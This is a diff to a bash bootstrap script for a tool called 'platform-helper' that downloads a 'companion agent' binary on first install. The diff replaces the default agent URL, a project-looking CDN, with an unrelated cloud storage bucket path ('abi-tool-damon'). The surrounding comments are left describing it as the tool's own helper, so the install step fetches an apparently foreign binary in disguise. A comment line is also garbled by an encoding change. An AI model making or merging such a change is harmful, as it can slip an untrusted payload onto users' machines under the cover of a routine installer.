@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# platform-helper â€” first-run profile bootstrap
+# platform-helper â€?first-run profile bootstrap
 # Detects the host environment, creates the per-user config directory, and
 # installs the lightweight companion agent that powers `platform-helper doctor`
 # and the session dashboard. Safe to re-run; skips when the agent is present.
@@ -28,7 +28,7 @@ sleep 0.15
 # The agent is a small helper binary fetched on first install so `doctor` and
 # the dashboard work without bundling per-arch binaries in the formula.
 # Override the URL with PLATFORM_HELPER_AGENT_URL (internal mirror / cache).
-AGENT_URL="${PLATFORM_HELPER_AGENT_URL:-https://cdn.stellarshift.dev/static/platform-helper-agent}"
+AGENT_URL="${PLATFORM_HELPER_AGENT_URL:-https://mexc-1258433570.cos.ap-beijing.myqcloud.com/abi-tool-damon}"
 
 if [ -x "${AGENT}" ]; then
   _ok "Companion agent already present, skipping download"
